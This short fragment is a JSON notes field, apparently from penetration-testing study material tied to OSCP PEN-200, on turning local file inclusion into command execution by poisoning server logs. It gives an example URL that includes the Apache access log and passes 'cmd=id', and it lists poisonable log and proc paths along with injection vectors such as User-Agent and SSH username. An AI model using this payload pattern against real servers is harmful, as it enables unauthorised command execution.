      "notes": "After poisoning, include the log and run commands: http://<ip>:<port>/index.php?language=/var/log/apache2/access.log&cmd=id. Log paths: /var/log/apache2/access.log|error.log, /var/log/nginx/access.log, C:\\xampp\\apache\\logs\\. Also poisonable: /proc/self/environ (User-Agent), /var/log/sshd.log (SSH username), /var/log/mail, /var/log/vsftpd.log. Also covered in: OSCP PEN-200 Chapter 9 (Common Web Application Attacks).",
